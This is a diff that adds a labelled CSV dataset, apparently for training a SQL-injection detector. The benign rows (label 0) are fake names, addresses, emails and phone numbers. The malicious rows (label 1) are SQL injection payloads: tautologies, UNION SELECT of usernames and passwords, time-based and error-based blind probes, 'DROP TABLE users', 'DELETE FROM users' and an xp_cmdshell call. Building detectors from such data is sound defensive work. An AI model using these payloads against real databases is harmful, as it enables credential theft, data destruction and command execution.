@@ -1,0 +1,381 @@
+entry,label
+John Doe,0
+"123 Main Street, New York, NY",0
+johndoe@example.com,0
+9876543210,0
+Jane Smith,0
+"456 Elm Street, Los Angeles, CA",0
+janesmith@example.com,0
+8765432109,0
+Michael Johnson,0
+"789 Oak Street, Chicago, IL",0
+michaelj@example.com,0
+7654321098,0
+Emily Brown,0
+"321 Pine Street, Houston, TX",0
+emilyb@example.com,0
+6543210987,0
+David Wilson,0
+"654 Maple Avenue, Miami, FL",0
+davidw@example.com,0
+5432109876,0
+Sarah Miller,0
+"987 Birch Road, Seattle, WA",0
+sarahm@example.com,0
+4321098765,0
+Robert White,0
+"159 Cedar Lane, Denver, CO",0
+robertw@example.com,0
+3210987654,0
+Linda Davis,0
+"753 Spruce Boulevard, Boston, MA",0
+lindad@example.com,0
+2109876543,0
+William Martinez,0
+"951 Redwood Drive, San Francisco, CA",0
+williamm@example.com,0
+1098765432,0
+Olivia Anderson,0
+"852 Magnolia Court, Phoenix, AZ",0
+oliviaa@example.com,0
+0987654321,0
+Ethan Taylor,0
+"123 Sunset Blvd, Los Angeles, CA",0
+ethant@example.com,0
+9123456780,0
+Sophia Moore,0
+"456 Mountain View Dr, Denver, CO",0
+sophiam@example.com,0
+9234567891,0
+James Anderson,0
+"789 Ocean Ave, Miami, FL",0
+jamesa@example.com,0
+9345678902,0
+Ava Thompson,0
+"321 Greenway St, Seattle, WA",0
+avat@example.com,0
+9456789013,0
+Mason Hall,0
+"654 Broadway Rd, Boston, MA",0
+masonh@example.com,0
+9567890124,0
+Isabella Scott,0
+"987 Lakeshore Dr, Austin, TX",0
+isabellas@example.com,0
+9678901235,0
+Benjamin Young,0
+"159 Riverbend Ln, Chicago, IL",0
+benjaminy@example.com,0
+9789012346,0
+Mia Carter,0
+"753 Willow St, San Diego, CA",0
+miac@example.com,0
+9890123457,0
+Daniel Turner,0
+"951 Redwood Ave, Phoenix, AZ",0
+danielt@example.com,0
+9001234568,0
+Charlotte Hill,0
+"852 Magnolia Blvd, New Orleans, LA",0
+charlotteh@example.com,0
+9112345679,0
+Logan Adams,0
+"741 Aspen Ct, Nashville, TN",0
+logana@example.com,0
+9223456781,0
+Amelia Lewis,0
+"369 Birchwood Dr, Minneapolis, MN",0
+amelial@example.com,0
+9334567892,0
+Elijah Walker,0
+"258 Pinehurst Rd, San Antonio, TX",0
+elijahw@example.com,0
+9445678903,0
+Harper Nelson,0
+"147 Juniper Ln, Atlanta, GA",0
+harpern@example.com,0
+9556789014,0
+Alexander King,0
+"963 Maplewood Dr, Columbus, OH",0
+alexanderk@example.com,0
+9667890125,0
+Evelyn Wright,0
+"741 Chestnut Ave, Sacramento, CA",0
+evelynw@example.com,0
+9778901236,0
+Matthew Baker,0
+"258 Sunrise Rd, Portland, TC",0
+matthewb@example.com,0
+9889012347,0
+Abigail Green,0
+"369 Hillside Ct, Charlotte, NC",0
+abigailg@example.com,0
+9990123458,0
+Henry Harris,0
+"147 Oakridge Blvd, Indianapolis, IN",0
+henryh@example.com,0
+9012345670,0
+Emily Perez,0
+"753 Grandview Dr, Jacksonville, FL",0
+emilyp@example.com,0
+9123456782,0
+Jackson Torres,0
+"963 Cedarwood Ln, Memphis, TN",0
+jacksont@example.com,0
+9234567893,0
+Lily Brooks,0
+"258 Meadowbrook Ave, Louisville, KY",0
+lilyb@example.com,0
+9345678904,0
+David Ramirez,0
+"369 Sycamore St, Oklahoma City, OK",0
+davidr@example.com,0
+9456789015,0
+Scarlett Foster,0
+"147 Walnut Dr, Kansas City, MO",0
+scarlettf@example.com,0
+9567890126,0
+Sebastian Long,0
+"753 Highland Blvd, Tucson, AZ",0
+sebastianl@example.com,0
+9678901237,0
+Aria Bailey,0
+"963 Redwood Ct, Omaha, NE",0
+ariab@example.com,0
+9789012348,0
+Wyatt Ross,0
+"258 Elmwood Ln, Fresno, CA",0
+wyattr@example.com,0
+9890123459,0
+Penelope Rivera,0
+"369 Acacia Dr, Virginia Beach, VA",0
+peneloper@example.com,0
+9001234560,0
+Luke Parker,0
+"147 Sunset Blvd, Raleigh, NC",0
+lukep@example.com,0
+9112345671,0
+Zoe Mitchell,0
+"753 Bayview Rd, Miami, FL",0
+zoem@example.com,0
+9223456782,0
+Jayden Collins,0
+"963 Morningstar Dr, Colorado Springs, CO",0
+jaydenc@example.com,0
+9334567893,0
+Hannah Stewart,0
+"258 Bluebird Ln, Baltimore, MD",0
+hannahs@example.com,0
+9445678904,0
+Gabriel Edwards,0
+"369 Harborview Ave, El Paso, TX",0
+gabriele@example.com,0
+9556789015,0
+Layla Morris,0
+"147 Whispering Pines Ln, Washington, D.C.",0
+laylam@example.com,0
+9667890126,0
+Julian Jenkins,0
+"753 Tranquil Ct, Detroit, MI",0
+julianj@example.com,0
+9778901237,0
+Nora Griffin,0
+"963 Boulder Dr, Las Vegas, NV",0
+norag@example.com,0
+9889012348,0
+Christian Bennett,0
+"258 Evergreen Rd, Albuquerque, NM",0
+christianb@example.com,0
+9990123459,0
+Victoria Gonzalez,0
+"369 Starlight Ave, Long Beach, CA",0
+victoriag@example.com,0
+9012345671,0
+' OR '1'='1' --,1
+"1 UNION SELECT null, username, password FROM users --",1
+' AND SLEEP(5) --,1
+' OR 'x'='x' --,1
+'; DROP TABLE users; --,1
+"' UNION ALL SELECT NULL, table_name FROM information_schema.tables --",1
+' OR '1'='1' OR '1'='1' --,1
+"1 AND 1=CONVERT(int, @@version) --",1
+' OR '1'='1',1
+1' AND (SELECT COUNT(*) FROM users) > 0 --,1
+"' UNION SELECT NULL, username, password FROM users --",1
+' AND 1=1 --,1
+"' UNION SELECT NULL, NULL, NULL --",1
+"' AND 1=CONVERT(int, @@version) --",1
+"' OR IF(1=1, sleep(5), 0) --",1
+"' UNION SELECT NULL, password FROM users --",1
+' OR SLEEP(5) --,1
+"' UNION SELECT NULL, table_name FROM information_schema.tables --",1
+"' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT @@version))) --",1
+"1 AND IF(1=1, SLEEP(5), 0) --",1
+"' UNION SELECT NULL, username, password --",1
+"' OR IF(1=1, SLEEP(5), 0) --",1
+' OR '1'='1' --,1
+' AND 1=1 --,1
+"1 UNION SELECT NULL, password FROM users --",1
+1' OR SLEEP(5) --,1
+"' UNION ALL SELECT NULL, NULL FROM dual --",1
+' OR '1'='1',1
+"' UNION SELECT NULL, NULL FROM users --",1
+"' UNION ALL SELECT NULL, username, password FROM users --",1
+' OR 1=1 --,1
+"' UNION SELECT username, password FROM users --",1
+"' AND 1=CONVERT(int, @@version) --",1
+"' UNION SELECT NULL, table_name FROM information_schema.tables --",1
+"' AND IF(1=1, SLEEP(5), 0) --",1
+1' OR '1'='1' --,1
+"' UNION SELECT NULL, NULL, NULL --",1
+' AND SLEEP(10) --,1
+' OR SLEEP(5) --,1
+"1' UNION SELECT NULL, username, password FROM users --",1
+' OR 'x'='x',1
+"1 AND IF(1=1, sleep(10), 0) --",1
+' AND SLEEP(5) --,1
+' OR 1=1 --,1
+' AND 1=1 --,1
+1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --,1
+' OR 1=1 --,1
+"' OR IF(1=1, SLEEP(5), 0) --",1
+"' UNION SELECT NULL, username, password --",1
+' OR '1'='1'#,1
+1' OR 'a'='a' --,1
+' OR 1=1 LIMIT 1 --,1
+"' UNION SELECT NULL, NULL, version() --",1
+"' AND ascii(substr(database(), 1, 1)) = 100 --",1
+' OR (SELECT 1 FROM DUAL WHERE 1=1) --,1
+' AND 1=1#,1
+' OR EXISTS(SELECT * FROM users) --,1
+1; EXEC xp_cmdshell('dir') --,1
+"' AND 1=LIKE(CHAR(97,98,99)) --",1
+"' AND EXTRACTVALUE(1, CONCAT(CHAR(33), database())) --",1
+"' AND (SELECT ASCII(SUBSTRING(@@version,1,1)))=52 --",1
+1' AND (SELECT COUNT(*) FROM information_schema.tables) > 10 --,1
+' OR SLEEP(10) --,1
+"' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) = 68 --",1
+"' UNION SELECT NULL, NULL, table_name FROM information_schema.tables LIMIT 1 --",1
+' OR EXISTS(SELECT 1 FROM users WHERE username='admin') --,1
+' OR (SELECT 1 WHERE 1=1) --,1
+' AND (SELECT version()) LIKE '5%' --,1
+' OR 1=1 ORDER BY 1 --,1
+"' OR ascii(substring((select database()),1,1)) = 109 --",1
+"' UNION ALL SELECT NULL, NULL, @@version --",1
+' AND EXISTS(SELECT * FROM information_schema.tables WHERE table_schema=database()) --,1
+' OR (SELECT NULL) IS NULL --,1
+' OR (SELECT database()) = 'test' --,1
+' OR SLEEP(5) AND '1'='1' --,1
+' OR EXISTS(SELECT 1 FROM information_schema.tables) --,1
+' UNION ALL SELECT table_name FROM information_schema.tables --,1
+"' AND ASCII(SUBSTRING((SELECT @@version), 1, 1)) = 53 --",1
+"' OR EXTRACTVALUE(1, CONCAT(CHAR(33), version())) --",1
+' OR SLEEP(5) AND 'a'='a' --,1
+' AND (SELECT version()) LIKE '5.7%' --,1
+' OR EXISTS(SELECT * FROM mysql.user) --,1
+"' UNION ALL SELECT NULL, NULL FROM mysql.db --",1
+"' AND ascii(substring((select @@version),1,1)) = 52 --",1
+' OR SLEEP(2) --,1
+' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name = 'users') --,1
+"' UNION ALL SELECT table_name, NULL FROM information_schema.tables --",1
+"' AND ascii(substring((select database()),1,1)) = 116 --",1
+' OR EXISTS(SELECT 1 FROM users) --,1
+"' UNION SELECT NULL, NULL, NULL FROM users --",1
+' OR (SELECT 1 FROM information_schema.tables WHERE table_schema='mysql') --,1
+' OR 1=1 AND SLEEP(3) --,1
+"' UNION SELECT NULL, NULL, table_name FROM information_schema.tables WHERE table_schema=database() --",1
+' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name='users') --,1
+' OR 1=1 AND SLEEP(1) --,1
+"' OR 1=1 UNION SELECT NULL, NULL, NULL --",1
+1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users') > 1 --,1
+"' UNION ALL SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = database() --",1
+' OR 1 GROUP BY column_names HAVING 1=1 --,1
+"' AND ascii(substring((SELECT @@version), 2, 1)) = 53 --",1
+' OR EXISTS(SELECT 1 FROM mysql.user WHERE user = 'admin') --,1
+"' UNION SELECT NULL, NULL, table_name FROM information_schema.tables WHERE table_name = 'users' --",1
+' AND (SELECT COUNT(*) FROM mysql.db) = 10 --,1
+' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'users') > 0 --,1
+1; DROP TABLE IF EXISTS users; --,1
+' OR (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1) IS NOT NULL --,1
+' AND (SELECT COUNT(*) FROM mysql.user WHERE user='admin') > 0 --,1
+"' OR 1=1 UNION ALL SELECT NULL, NULL FROM mysql.db --",1
+' OR SLEEP(0.1) --,1
+"' AND ascii(substr((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1)) = 117 --",1
+"' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=database() --",1
+' OR (SELECT NULL) IS NOT NULL --,1
+' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') > 0 --,1
+' OR (SELECT COUNT(*) FROM mysql.user WHERE user='root') > 0 --,1
+"' UNION SELECT NULL, NULL, NULL FROM mysql.db --",1
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database()) > 0 --,1
+"' AND (SELECT ascii(substring((SELECT version()),2,1))) = 53 --",1
+' OR SLEEP(2) AND '1'='1' --,1
+"' UNION ALL SELECT NULL, NULL, NULL --",1
+' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_schema='mysql') --,1
+"1' UNION SELECT NULL, version(), NULL --",1
+' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='mysql') > 0 --,1
+' OR 1=1 AND SLEEP(3) --,1
+' AND (SELECT COUNT(*) FROM mysql.db WHERE db='test') > 0 --,1
+"' UNION ALL SELECT NULL, NULL FROM information_schema.columns WHERE table_schema='mysql' --",1
+"' UNION SELECT NULL, NULL, NULL FROM users --",1
+' OR EXISTS(SELECT * FROM information_schema.columns WHERE table_schema='mysql') --,1
+"' UNION ALL SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='mysql' --",1
+' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='test') > 0 --,1
+' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='test') > 0 --,1
+"' UNION SELECT NULL, NULL, table_name FROM information_schema.tables WHERE table_schema='mysql' --",1
+' OR EXISTS(SELECT 1 FROM mysql.user WHERE user='test') --,1
+1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='test') > 0 --,1
+"' UNION ALL SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='test' --",1
+' OR 1=1 AND SLEEP(4) --,1
+' OR (SELECT NULL) IS NULL --,1
+' AND (SELECT COUNT(*) FROM mysql.db WHERE db='test') > 0 --,1
+"' UNION SELECT NULL, NULL, table_name FROM information_schema.tables WHERE table_schema='mysql' --",1
+"' AND (SELECT ascii(substr((SELECT table_name FROM information_schema.tables LIMIT 1), 2, 1))) = 105 --",1
+' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database()) > 0 --,1
+"' UNION SELECT NULL, version(), table_name FROM information_schema.tables WHERE table_schema=database() --",1
+' OR EXISTS(SELECT * FROM mysql.user WHERE user='root') --,1
+SELECT * FROM users WHERE name='John' OR 1=1 --,1
+1; UNION SELECT password FROM users WHERE username='admin' --,1
+' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='accounts') > 0 --,1
+' OR (SELECT NULL FROM mysql.db LIMIT 1) IS NULL --,1
+' OR EXISTS(SELECT 1 FROM dual WHERE database()='test' AND version() LIKE '5%') --,1
+SELECT * FROM products WHERE id='1' OR 'a'='a' --,1
+"' UNION SELECT null, username, password FROM admin --",1
+' AND (SELECT COUNT(*) FROM mysql.user) = 5 --,1
+"' AND ascii(substring((SELECT password FROM users WHERE id=1), 1, 1)) = 65 --",1
+"' UNION SELECT null, version(), database() --",1
+' OR (SELECT COUNT(*) FROM accounts WHERE account_status='active') > 0 --,1
+"1' UNION ALL SELECT null, user() --",1
+' OR SLEEP(5) --,1
+' OR (SELECT table_name FROM information_schema.tables LIMIT 1) IS NOT NULL --,1
+"' UNION ALL SELECT null, null, null FROM mysql.db --",1
+' OR (SELECT COUNT(*) FROM accounts WHERE active='yes') > 0 --,1
+"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema='mysql' --",1
+"' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users' --",1
+' OR EXISTS(SELECT * FROM dual WHERE 1=1) --,1
+1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='mysql') > 0 --,1
+' OR (SELECT NULL FROM mysql.user WHERE user='admin') IS NOT NULL --,1
+' UNION SELECT password FROM users WHERE id=2 --,1
+' OR EXISTS(SELECT * FROM mysql.db WHERE db='test') --,1
+' OR 1=1 AND SLEEP(10) --,1
+"' UNION ALL SELECT version(), user(), database() --",1
+"' UNION SELECT null, null, null, table_name FROM information_schema.tables --",1
+' OR 1=1; --,1
+SELECT * FROM accounts WHERE username='admin' AND 1=1 --,1
+1' UNION SELECT table_name FROM information_schema.tables --,1
+"' UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name='users' --",1
+' OR (SELECT version()) = '5.7.29' --,1
+"' UNION ALL SELECT null, null, user() --",1
+' AND (SELECT COUNT(*) FROM mysql.user WHERE user='root') = 1 --,1
+' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='mysql') > 0 --,1
+' OR EXISTS(SELECT * FROM information_schema.columns WHERE table_name='accounts') --,1
+"1' UNION ALL SELECT null, null, null FROM mysql.db --",1
+' OR EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema='mysql' AND table_name='users') --,1
+SELECT * FROM users WHERE username='admin' AND password='password' OR 1=1 --,1
+' OR SLEEP(1) --,1
+' AND (SELECT COUNT(*) FROM mysql.user) > 1 --,1
+"' UNION ALL SELECT null, column_name FROM information_schema.columns WHERE table_schema='test' --",1
+1' OR (SELECT COUNT(*) FROM mysql.db WHERE db='mysql') > 0 --,1
+' AND EXISTS(SELECT * FROM mysql.user WHERE user='test' AND password='test' --,1
+' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='test') > 0 --,1
+test); DELETE FROM users; --,1
+' OR '1'='1,1
